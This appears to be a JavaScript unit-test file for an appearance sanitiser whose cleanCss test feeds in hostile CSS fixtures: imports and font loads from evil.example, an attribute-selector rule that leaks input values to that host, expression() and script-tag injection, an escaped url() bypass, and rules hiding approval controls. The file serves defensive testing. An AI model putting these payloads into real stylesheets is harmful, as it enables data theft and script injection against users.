import { test } from "node:test";
import assert from "node:assert/strict";
import { cleanAppearance, cleanColor, isLight, resolveAppearance } from "./appearance.js";

test("cleanAppearance keeps only valid looks", () => {
  const a = cleanAppearance({
    colors: { bg: "#FFF", accent: "red", text: "url(evil)", "panel-2": "#123456" },
    font: "Heebo",
    fontSize: 99,
    radius: -4,
    density: "huge",
    background: { kind: "gradient", from: "#000", to: "javascript:x" },
    navOrder: ["work", "work", "nope", "create"],
    extra: "x",
  });
  assert.deepEqual(a, { colors: { bg: "#ffffff", "panel-2": "#123456", accent: "#e5484d" }, font: "heebo", fontSize: 20, radius: 0, navOrder: ["work", "create"] });
});

test("presets sit under the user's own colours", () => {
  const r = resolveAppearance({ preset: "paper", colors: { accent: "#00ff00" } });
  assert.equal(r.colors?.bg, "#f6f5f2");
  assert.equal(r.colors?.accent, "#00ff00");
});

test("colours", () => {
  assert.equal(cleanColor("#abc"), "#aabbcc");
  assert.equal(cleanColor("rgb(1,2,3)"), undefined);
  assert.ok(isLight("#f6f5f2"));
  assert.ok(!isLight("#121213"));
});

test("cleanCss keeps looks and drops everything that could reach out or hide the safety parts", async () => {
  const { cleanCss } = await import("./appearance.js");
  const css = cleanCss(`
    @import url(https://evil.example/x.css);
    @font-face { font-family: x; src: url(https://evil.example/f.woff); }
    @layer guard { .approval { display: none } }
    /* comment */
    .card { border-radius: 4px; background: url(https://evil.example/leak?) ; color: red !important }
    .home { background: url("/api/assets/0f8fad5b-d9cb-469f-a165-70867728950e") center }
    input[value^="a"] { background-image: url(//evil.example/a) }
    .x { width: expression(alert(1)); height: 10px }
    .y::before { content: "★"; position: fixed; z-index: 99999 }
    @media (max-width: 600px) { .card { padding: 4px } }
    @keyframes drift { from { transform: translateY(0) } to { transform: translateY(4px) } }
    .z { --guard-display: none; color: blue }
    .esc { content: "\\75 rl(https://evil.example)" }
    </style><script>alert(1)</script>
  `);
  assert.doesNotMatch(css, /evil|@import|@font-face|@layer|expression|--guard|<script/);
  assert.match(css, /\.card \{ border-radius: 4px !important; color: red !important \}/);
  assert.match(css, /url\("\/api\/assets\/0f8fad5b-d9cb-469f-a165-70867728950e"\) center !important/);
  assert.match(css, /\.y::before \{ content: "★" !important; pointer-events: none !important \}/);
  assert.match(css, /@media \(max-width: 600px\) \{ \.card \{ padding: 4px !important \} \}/);
  assert.match(css, /@keyframes drift \{ from \{ transform: translateY\(0\) \}/);
  assert.match(css, /\.z \{ color: blue !important \}/);
});
